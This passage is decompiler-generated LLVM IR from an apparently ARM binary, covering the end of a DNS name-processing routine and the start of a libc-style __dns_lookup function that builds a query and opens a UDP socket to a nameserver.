  %v0_128f0 = load i32, i32* @ip, align 4
  %v2_128f0 = icmp eq i32 %v0_128f0, 0
  br i1 %v2_12850, label %dec_label_pc_128f0, label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %dec_label_pc_1284c.preheader, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge
  %v2_128f066 = phi i1 [ %v2_128f0, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ false, %dec_label_pc_1284c.preheader ]
  %v0_128f064 = phi i32 [ %v0_128f0, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ 1, %dec_label_pc_1284c.preheader ]
  %v6_1284c63 = phi i32 [ %v6_1284c, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ %v6_1284c54, %dec_label_pc_1284c.preheader ]
  %v0_1287862 = phi i32 [ %v0_1284c.pre, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ %v0_1281c, %dec_label_pc_1284c.preheader ]
  %v0_1286861 = phi i32 [ %v0_12844, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ %v0_128444, %dec_label_pc_1284c.preheader ]
  %v0_1288c60 = phi i32 [ %v0_12840, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ 0, %dec_label_pc_1284c.preheader ]
  %v1_1287059 = phi i32 [ %v1_12844, %dec_label_pc_12840.dec_label_pc_1284c_crit_edge ], [ %arg2, %dec_label_pc_1284c.preheader ]
  %v1_1285c = and i32 %v6_1284c63, 192
  br i1 %v2_128f066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_12858
  %v1_12860 = load i32, i32* %r8.global-to-local, align 4
  %v2_12860 = add i32 %v1_12860, 1
  store i32 %v2_12860, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_12858, %bb
  %v2_12864 = icmp eq i32 %v1_1285c, 192
  %v1_12868 = add i32 %v0_1286861, 1
  store i32 %v1_12868, i32* @r1, align 4
  br i1 %v2_12864, label %dec_label_pc_12870, label %dec_label_pc_12898

dec_label_pc_12870:                               ; preds = %bb42
  %v6_12874 = icmp slt i32 %v1_12868, %v1_1287059
  br i1 %v6_12874, label %dec_label_pc_12878, label %dec_label_pc_12904

dec_label_pc_12878:                               ; preds = %dec_label_pc_12870
  %v2_12878 = add i32 %v1_12868, %v0_1287862
  %v3_12878 = inttoptr i32 %v2_12878 to i8*
  %v4_12878 = load i8, i8* %v3_12878, align 1
  %v6_12878 = zext i8 %v4_12878 to i32
  %v1_12880 = urem i32 %v6_1284c63, 64
  br i1 %v2_128f066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_12878
  %v1_12884 = load i32, i32* %r8.global-to-local, align 4
  %v2_12884 = add i32 %v1_12884, 1
  store i32 %v2_12884, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_12878, %bb43
  %v4_12888 = mul nuw nsw i32 %v1_12880, 256
  %v5_12888 = or i32 %v6_12878, %v4_12888
  store i32 %v5_12888, i32* @r1, align 4
  store i32 %v0_1288c60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12840

dec_label_pc_12898:                               ; preds = %bb42
  %v2_12898 = add i32 %v6_1284c63, %v0_1288c60
  store i32 %v2_12898, i32* %r6.global-to-local, align 4
  %v3_1289c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1289c, i32* @r3, align 4
  %v1_128a0 = add i32 %v2_12898, 1
  store i32 %v1_128a0, i32* %r7.global-to-local, align 4
  %v3_128a4 = icmp ult i32 %v1_128a0, %v3_1289c
  br i1 %v3_128a4, label %dec_label_pc_128ac, label %dec_label_pc_12904

dec_label_pc_128ac:                               ; preds = %dec_label_pc_12898
  %v2_128ac = add i32 %v6_1284c63, %v1_12868
  store i32 %v2_128ac, i32* @r5, align 4
  %v3_128b0 = icmp ult i32 %v2_128ac, %v1_1287059
  br i1 %v3_128b0, label %dec_label_pc_128b8, label %dec_label_pc_12904

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128ac
  %v2_128b8 = add i32 %v1_12868, %v0_1287862
  store i32 %v2_128b8, i32* @r1, align 4
  %v0_128bc = load i32, i32* %sb.global-to-local, align 4
  %v2_128bc = add i32 %v0_128bc, %v0_1288c60
  store i32 %v2_128bc, i32* @r0, align 4
  store i32 %v6_1284c63, i32* @r2, align 4
  %v0_128c8 = call i32 @memcpy()
  store i32 %v0_128c8, i32* %r0.global-to-local, align 4
  store i32 %v0_128f064, i32* @ip, align 4
  %v0_128d0 = load i32, i32* %sl.global-to-local, align 4
  %v1_128d0 = load i32, i32* @r5, align 4
  %v2_128d0 = add i32 %v1_128d0, %v0_128d0
  %v3_128d0 = inttoptr i32 %v2_128d0 to i8*
  %v4_128d0 = load i8, i8* %v3_128d0, align 1
  br i1 %v2_128f066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_128b8
  %v1_128d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_128d8 = load i32, i32* @r4, align 4
  %v3_128d8 = add i32 %v2_128d8, %v1_128d8
  store i32 %v3_128d8, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_128b8, %bb45
  %v2_128dc = icmp eq i8 %v4_128d0, 0
  br i1 %v2_128dc, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_128e8.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_128d0, i32* @r1, align 4
  %v2_128e8 = load i32, i32* %sb.global-to-local, align 4
  %v3_128e8 = load i32, i32* %r6.global-to-local, align 4
  %v4_128e8 = add i32 %v3_128e8, %v2_128e8
  %v5_128e8 = inttoptr i32 %v4_128e8 to i8*
  store i8 %v0_128e8.off0, i8* %v5_128e8, align 1
  %v0_12840.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_12844.pre = load i32, i32* @r1, align 4
  %v1_12844.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12840

dec_label_pc_128f0:                               ; preds = %dec_label_pc_12840.dec_label_pc_1284c_crit_edge
  %v0_128f8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_128f0, label %dec_label_pc_12904, label %bb49

bb49:                                             ; preds = %dec_label_pc_1284c.preheader, %dec_label_pc_128f0
  %v0_128f8.pre69 = phi i32 [ %v0_128f8.pre.pre, %dec_label_pc_128f0 ], [ 0, %dec_label_pc_1284c.preheader ]
  %v2_128f4 = add i32 %v0_128f8.pre69, 1
  store i32 %v2_128f4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12904

dec_label_pc_12904:                               ; preds = %dec_label_pc_128ac, %dec_label_pc_12898, %dec_label_pc_12870, %dec_label_pc_12840, %dec_label_pc_128f0, %dec_label_pc_12844.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_128f4, %bb49 ], [ -1, %dec_label_pc_12844.preheader ], [ %v0_128f8.pre.pre, %dec_label_pc_128f0 ], [ -1, %dec_label_pc_12898 ], [ -1, %dec_label_pc_128ac ], [ -1, %dec_label_pc_12840 ], [ -1, %dec_label_pc_12870 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_12818, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_128f8.pre.pre, { 1, 0 }
  uselistorder i32 %v1_128d0, { 1, 0 }
  uselistorder i32 %v5_12888, { 1, 0 }
  uselistorder i32 %v1_12868, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1288c60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1284c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_128f066, { 1, 2, 0 }
  uselistorder i32 %v0_1281c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_12904, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_12858, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %tmp163 = call i32 @__decompiler_undefined_function_0()
  %tmp164 = call i32 @__decompiler_undefined_function_0()
  %tmp165 = call i32 @__decompiler_undefined_function_0()
  %tmp176 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_12910 = load i32, i32* @r4, align 4
  %v6_12910 = load i32, i32* @r5, align 4
  %v9_12910 = load i32, i32* @r6, align 4
  %v12_12910 = load i32, i32* @r7, align 4
  %v15_12910 = load i32, i32* @r8, align 4
  %v18_12910 = load i32, i32* @sb, align 4
  %v21_12910 = load i32, i32* @sl, align 4
  %v24_12910 = load i32, i32* @fp, align 4
  %v27_12910 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @sb, align 4
  %v0_12924 = load i32, i32* %r1.global-to-local, align 4
  %v1_1292c = call i32 @malloc(i32 512)
  store i32 %v1_1292c, i32* @sl, align 4
  %v0_12934 = load i32, i32* @r4, align 4
  %v1_12934 = inttoptr i32 %v0_12934 to i8*
  %v3_12938 = call i32 @strlen(i8* %v1_12934)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_12944 = icmp ugt i32 %v3_12938, 893
  store i1 %v3_12944, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r8, align 4
  %tmp288 = icmp ugt i32 %v3_12938, 894
  br i1 %tmp288, label %.thread134, label %dec_label_pc_12964

.thread134:                                       ; preds = %entry
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13088

dec_label_pc_12964:                               ; preds = %entry
  store i32 %v3_12938, i32* %r2.global-to-local, align 4
  %v1_12968 = add i32 %v3_12938, 130
  %v1_1296c = call i32 @malloc(i32 %v1_12968)
  store i32 %v1_1296c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12970 = icmp eq i32 %v1_1296c, 0
  br i1 %v2_12970, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_12964
  %v1_12974 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_12974 = icmp eq i32 %v1_12974, 0
  br i1 %v3_12974, label %bb217, label %dec_label_pc_12988

.thread6:                                         ; preds = %dec_label_pc_12964
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_13080

bb217:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_13080

dec_label_pc_12988:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_12988 = load i32, i32* @r4, align 4
  %v1_12988 = inttoptr i32 %v0_12988 to i8*
  %v2_12988 = load i8, i8* %v1_12988, align 1
  %v3_12988 = zext i8 %v2_12988 to i32
  store i32 %v3_12988, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1298c = icmp eq i8 %v2_12988, 0
  br i1 %v2_1298c, label %dec_label_pc_13080, label %dec_label_pc_12994

dec_label_pc_12994:                               ; preds = %dec_label_pc_12988
  %v2_12998 = add i32 %v0_12988, %v3_12938
  store i32 %v2_12998, i32* %r3.global-to-local, align 4
  %v1_1299c = add i32 %v2_12998, -1
  %v2_1299c = inttoptr i32 %v1_1299c to i8*
  %v3_1299c = load i8, i8* %v2_1299c, align 1
  %v4_1299c = zext i8 %v3_1299c to i32
  store i32 %v4_1299c, i32* @r3, align 4
  store i32 %v3_12938, i32* @r2, align 4
  store i32 %v0_12988, i32* @r1, align 4
  %v0_129ac = call i32 @memcpy()
  store i32 13212, i32* %r3.global-to-local, align 4
  store i32 12196, i32* %r1.global-to-local, align 4
  store i32 703, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v2_12a24 = ptrtoint i32* %stack_var_-76 to i32
  %v2_12b34 = ptrtoint i16* %stack_var_-104 to i32
  %v2_12b5c = ptrtoint i32* %stack_var_-192 to i32
  %v3_12b7c = bitcast i32* %stack_var_-192 to i8*
  %v2_12c30 = ptrtoint i32* %stack_var_-48 to i32
  %v2_12cc8 = icmp eq i32 %tmp165, 0
  %v1_12cd4 = add i32 %tmp164, -2
  %v2_12cd8 = icmp ne i32 %v1_12cd4, 0
  %tmp218 = icmp slt i32 %tmp163, 1
  %v2_12dd4 = ptrtoint i32* %stack_var_-448 to i32
  %v2_12dd8 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1302c57 = icmp sgt i32 %tmp163, 0
  %v2_12f54 = icmp ne i32 %v0_12924, 0
  %v7_12f54 = icmp eq i32 %v0_12924, 1
  %v1_12e3c = bitcast i32* %stack_var_-448 to i8*
  %v2_12ef0 = icmp eq i32 %tmp148, 0
  %v2_12ce4 = icmp ugt i8 %v3_1299c, 45
  %v7_12ce4 = icmp eq i8 %v3_1299c, 46
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_12a78 = add i32 %v1_1296c, %v3_12938
  %v5_12a78 = inttoptr i32 %v4_12a78 to i8*
  %v1_12cd4.cmp = icmp ugt i32 %v1_12cd4, 1
  %v2_12d14 = icmp eq i32 %tmp164, 0
  %v3_12f58 = icmp ugt i32 %v0_12924, 27
  %v8_12f58 = icmp eq i32 %v0_12924, 28
  br label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_13068, %dec_label_pc_12994
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_12994 ], [ %v1_1306c, %dec_label_pc_13068 ]
  %stack_var_-464.0 = phi i32 [ %tmp176, %dec_label_pc_12994 ], [ %v3_12b14, %dec_label_pc_13068 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_12994 ], [ %stack_var_-468.2, %dec_label_pc_13068 ]
  %v1_12a10 = phi i32 [ -1, %dec_label_pc_12994 ], [ %v3_12be8, %dec_label_pc_13068 ]
  store i32 %v1_12a10, i32* %r3.global-to-local, align 4
  %v2_12a0c = icmp eq i32 %v1_12a10, -1
  store i1 %v2_12a0c, i1* %cpsr_c.global-to-local, align 1
  %v7_12a0c = icmp eq i32 %v1_12a10, -1
  br i1 %v7_12a0c, label %bb220, label %bb219

bb219:                                            ; preds = %dec_label_pc_12a08
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_12a08, %bb219
  %v1_12a14 = xor i1 %v7_12a0c, true
  call void @__pseudo_cond_branch(i1 %v1_12a14, i32 ptrtoint (i32* @global_var_dbe0.473 to i32))
  %v0_12a20 = load i32, i32* @r8, align 4
  %v2_12a20 = add i32 %v0_12a20, 76
  %v3_12a20 = inttoptr i32 %v2_12a20 to i32*
  %v4_12a20 = load i32, i32* %v3_12a20, align 4
  store i32 %v4_12a20, i32* @r4, align 4
  store i32 %v2_12a24, i32* @r5, align 4
  %v2_12a28 = add i32 %v0_12a20, 72
  %v3_12a28 = inttoptr i32 %v2_12a28 to i32*
  %v4_12a28 = load i32, i32* %v3_12a28, align 4
  store i32 %v4_12a28, i32* %r1.global-to-local, align 4
  store i32 %v4_12a20, i32* %r2.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_12a38 = add i32 %v0_12a20, 120
  %v3_12a38 = inttoptr i32 %v2_12a38 to i32*
  %v4_12a38 = load i32, i32* %v3_12a38, align 4
  call void @__pseudo_branch(i32 %v4_12a38)
  %v0_12a4c = load i32, i32* @r8, align 4
  %v2_12a4c = add i32 %v0_12a4c, 16
  %v3_12a4c = inttoptr i32 %v2_12a4c to i32*
  %v4_12a4c = load i32, i32* %v3_12a4c, align 4
  store i32 76376, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12a4c)
  %v0_12a58 = call i32 @__open_nameservers()
  %v0_12a60 = load i32, i32* @r8, align 4
  %v2_12a60 = add i32 %v0_12a60, 13212
  %v3_12a60 = inttoptr i32 %v2_12a60 to i32*
  %v4_12a60 = load i32, i32* %v3_12a60, align 4
  store i32 %v1_1296c, i32* %r1.global-to-local, align 4
  store i32 %v3_12938, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v0_12a70 = load i32, i32* @r7, align 4
  %v3_12a70 = icmp uge i32 %v0_12a70, %v4_12a60
  store i1 %v3_12a70, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_12a78, align 1
  %v0_12a7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12a7c, label %dec_label_pc_12aa0, label %dec_label_pc_12a80

dec_label_pc_12a80:                               ; preds = %bb220
  store i32 46, i32* %r3.global-to-local, align 4
  %v2_12a84 = load i32, i32* %r1.global-to-local, align 4
  %v3_12a84 = load i32, i32* %r2.global-to-local, align 4
  %v4_12a84 = add i32 %v3_12a84, %v2_12a84
  %v5_12a84 = inttoptr i32 %v4_12a84 to i8*
  store i8 46, i8* %v5_12a84, align 1
  %v0_12a8c = load i32, i32* @r8, align 4
  %v2_12a8c = add i32 %v0_12a8c, 13200
  %v3_12a8c = inttoptr i32 %v2_12a8c to i32*
  %v4_12a8c = load i32, i32* %v3_12a8c, align 4
  store i32 %v4_12a8c, i32* %r3.global-to-local, align 4
  %v0_12a90 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a90 = add i32 %v0_12a90, 1
  %v1_12a94 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a94 = add i32 %v1_12a90, %v1_12a94
  %v1_12a98 = load i32, i32* @r7, align 4
  %v2_12a98 = and i32 %v1_12a98, 1073741824
  %v3_12a98 = icmp ne i32 %v2_12a98, 0
  store i1 %v3_12a98, i1* %cpsr_c.global-to-local, align 1
  %v4_12a98 = mul i32 %v1_12a98, 4
  %v5_12a98 = add i32 %v4_12a98, %v4_12a8c
  %v6_12a98 = inttoptr i32 %v5_12a98 to i32*
  %v7_12a98 = load i32, i32* %v6_12a98, align 4
  store i32 %v7_12a98, i32* @r1, align 4
  %v2_12a9c = inttoptr i32 %v2_12a94 to i8*
  %v3_12a9c = call i32 @strcpy(i8* %v2_12a9c, i32 %v7_12a98)
  br label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %bb220, %dec_label_pc_12a80
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12aa4 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_12aa4, label %dec_label_pc_12aac, label %dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge

dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge:  ; preds = %dec_label_pc_12aa0
  %v0_12ae4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12aac:                               ; preds = %dec_label_pc_12aa0
  store i32 13208, i32* %r3.global-to-local, align 4
  store i32 703, i32* %r1.global-to-local, align 4
  %v0_12ab4 = load i32, i32* @r8, align 4
  %v2_12ab4 = add i32 %v0_12ab4, 13208
  %v3_12ab4 = inttoptr i32 %v2_12ab4 to i32*
  %v4_12ab4 = load i32, i32* %v3_12ab4, align 4
  store i32 %v4_12ab4, i32* %r2.global-to-local, align 4
  %v2_12ab8 = add i32 %v0_12ab4, 703
  %v3_12ab8 = inttoptr i32 %v2_12ab8 to i8*
  %v4_12ab8 = load i8, i8* %v3_12ab8, align 1
  %v6_12ab8 = zext i8 %v4_12ab8 to i32
  %v2_12abc = mul i32 %v6_12ab8, %v4_12ab4
  store i32 700, i32* %r2.global-to-local, align 4
  store i32 12196, i32* %r3.global-to-local, align 4
  %v2_12acc = add i32 %v0_12ab4, 700
  %v3_12acc = inttoptr i32 %v2_12acc to i16*
  %v4_12acc = load i16, i16* %v3_12acc, align 2
  %v6_12acc = zext i16 %v4_12acc to i32
  store i32 %v6_12acc, i32* %r2.global-to-local, align 4
  %v2_12ad0 = add i32 %v0_12ab4, 12196
  %v3_12ad0 = inttoptr i32 %v2_12ad0 to i32*
  %v4_12ad0 = load i32, i32* %v3_12ad0, align 4
  store i32 %v4_12ad0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge, %dec_label_pc_12aac
  %v2_12b20 = phi i32 [ %v0_12ab4, %dec_label_pc_12aac ], [ %v0_12ae4.pre, %dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_12acc, %dec_label_pc_12aac ], [ %stack_var_-464.0, %dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_12ad0, %dec_label_pc_12aac ], [ %stack_var_-468.0, %dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_12abc, %dec_label_pc_12aac ], [ %stack_var_-476.0, %dec_label_pc_12aa0.dec_label_pc_12adc_crit_edge ]
  store i32 13208, i32* %r3.global-to-local, align 4
  %v2_12ae4 = add i32 %v2_12b20, 13208
  %v3_12ae4 = inttoptr i32 %v2_12ae4 to i32*
  %v4_12ae4 = load i32, i32* %v3_12ae4, align 4
  store i32 %v4_12ae4, i32* %r2.global-to-local, align 4
  store i32 13204, i32* %r3.global-to-local, align 4
  %v3_12aec = icmp uge i32 %stack_var_-468.1, %v4_12ae4
  store i1 %v3_12aec, i1* %cpsr_c.global-to-local, align 1
  %v2_12af0 = add i32 %v2_12b20, 13204
  %v3_12af0 = inttoptr i32 %v2_12af0 to i32*
  %v4_12af0 = load i32, i32* %v3_12af0, align 4
  store i32 %v4_12af0, i32* %r3.global-to-local, align 4
  br i1 %v3_12aec, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_12adc
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_12adc, %bb221
  %v0_12afc = phi i32 [ %stack_var_-468.1, %dec_label_pc_12adc ], [ 0, %bb221 ]
  %v3_12afc = mul i32 %v0_12afc, 28
  %v4_12afc = add i32 %v3_12afc, %v4_12af0
  store i32 %v4_12afc, i32* %r3.global-to-local, align 4
  %v1_12b08 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_12b14 = urem i32 %v1_12b08, 65536
  store i32 12196, i32* %r1.global-to-local, align 4
  %v1_12b20 = trunc i32 %v1_12b08 to i16
  %v4_12b20 = add i32 %v2_12b20, 700
  %v5_12b20 = inttoptr i32 %v4_12b20 to i16*
  store i16 %v1_12b20, i16* %v5_12b20, align 2
  store i32 %v0_12afc, i32* %r2.global-to-local, align 4
  %v1_12b28 = load i32, i32* @r8, align 4
  %v2_12b28 = load i32, i32* %r1.global-to-local, align 4
  %v3_12b28 = add i32 %v2_12b28, %v1_12b28
  %v4_12b28 = inttoptr i32 %v3_12b28 to i32*
  store i32 %v0_12afc, i32* %v4_12b28, align 4
  %v0_12b2c = load i32, i32* %r3.global-to-local, align 4
  %v1_12b30 = inttoptr i32 %v0_12b2c to i32*
  %v2_12b30 = load i32, i32* %v1_12b30, align 4
  %v3_12b30 = add i32 %v0_12b2c, 4
  %v4_12b30 = inttoptr i32 %v3_12b30 to i32*
  %v5_12b30 = load i32, i32* %v4_12b30, align 4
  store i32 %v5_12b30, i32* %r1.global-to-local, align 4
  %v6_12b30 = add i32 %v0_12b2c, 8
  %v7_12b30 = inttoptr i32 %v6_12b30 to i32*
  %v8_12b30 = load i32, i32* %v7_12b30, align 4
  store i32 %v8_12b30, i32* %r2.global-to-local, align 4
  %v9_12b30 = add i32 %v0_12b2c, 12
  %v10_12b30 = inttoptr i32 %v9_12b30 to i32*
  %v11_12b30 = load i32, i32* %v10_12b30, align 4
  store i32 %v11_12b30, i32* %r3.global-to-local, align 4
  %v4_12b38 = trunc i32 %v2_12b30 to i16
  store i16 %v4_12b38, i16* %stack_var_-104, align 2
  %v3_12b3c = add i32 %v0_12b2c, 20
  %v4_12b3c = inttoptr i32 %v3_12b3c to i32*
  %v5_12b3c = load i32, i32* %v4_12b3c, align 4
  store i32 %v5_12b3c, i32* %r1.global-to-local, align 4
  %v6_12b3c = add i32 %v0_12b2c, 24
  %v7_12b3c = inttoptr i32 %v6_12b3c to i32*
  %v8_12b3c = load i32, i32* %v7_12b3c, align 4
  store i32 %v8_12b3c, i32* %r2.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_12b50 = load i32, i32* @r8, align 4
  %v2_12b50 = add i32 %v0_12b50, 48
  %v3_12b50 = inttoptr i32 %v2_12b50 to i32*
  %v4_12b50 = load i32, i32* %v3_12b50, align 4
  store i32 76636, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b50)
  store i32 %v2_12b5c, i32* @r6, align 4
  %v0_12b60 = load i32, i32* @fp, align 4
  store i32 %v0_12b60, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  %v0_12b68 = load i32, i32* @sl, align 4
  %v3_12b6c = inttoptr i32 %v0_12b68 to i8*
  %v4_12b6c = call i32 @__GI_memset(i8* %v3_12b6c, i32 %v0_12b60, i32 512)
  %v0_12b70 = load i32, i32* @fp, align 4
  store i32 %v0_12b70, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v4_12b7c = call i32 @__GI_memset(i8* %v3_12b7c, i32 %v0_12b70, i32 48)
  store i32 %v3_12b14, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_12b8c = load i32, i32* @sl, align 4
  store i32 %v0_12b8c, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 %v3_12b14, i32* %stack_var_-192, align 4
  %v6_12ba0 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_12b8c, i32 512, i32 %v3_12b14, i32 %v3_12b14)
  store i32 %v6_12ba0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12ba4 = icmp slt i32 %v6_12ba0, 0
  br i1 %v1_12ba4, label %dec_label_pc_13080, label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %bb222
  store i32 %v0_12924, i32* @ip, align 4
  store i32 %v1_1296c, i32* @r5, align 4
  %v0_12bbc = load i32, i32* @sl, align 4
  %v2_12bbc = add i32 %v0_12bbc, %v6_12ba0
  store i32 %v2_12bbc, i32* %r1.global-to-local, align 4
  %v1_12bc0 = sub i32 512, %v6_12ba0
  store i32 %v1_12bc0, i32* %r2.global-to-local, align 4
  store i32 %v1_1296c, i32* %stack_var_-60, align 4
  %v4_12bcc = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_12bbc, i32 %v1_12bc0)
  store i32 %v4_12bcc, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12bd0 = icmp slt i32 %v4_12bcc, 0
  br i1 %v1_12bd0, label %dec_label_pc_13080, label %dec_label_pc_12bd8

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12bac
  %v3_12bdc = load i16, i16* %stack_var_-104, align 2
  %v4_12bdc = sext i16 %v3_12bdc to i32
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_12be8 = call i32 @socket(i32 %v4_12bdc, i32 2, i32 17)
  store i32 %v3_12be8, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12bec = icmp slt i32 %v3_12be8, 0
  br i1 %v1_12bec, label %dec_label_pc_13058, label %dec_label_pc_12bf8

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12bd8
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_12b34, i32* %r1.global-to-local, align 4
  %v3_12c00 = call i32 @__libc_connect(i32 %v3_12be8, i32 %v2_12b34, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12c04 = icmp slt i32 %v3_12c00, 0
  br i1 %v1_12c04, label %dec_label_pc_13058, label %dec_label_pc_12c0c

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12bf8
  %v0_12c0c = load i32, i32* @r5, align 4
  %v1_12c0c = load i32, i32* @r4, align 4
  %v2_12c0c = add i32 %v1_12c0c, %v0_12c0c
  store i32 %v2_12c0c, i32* %r2.global-to-local, align 4
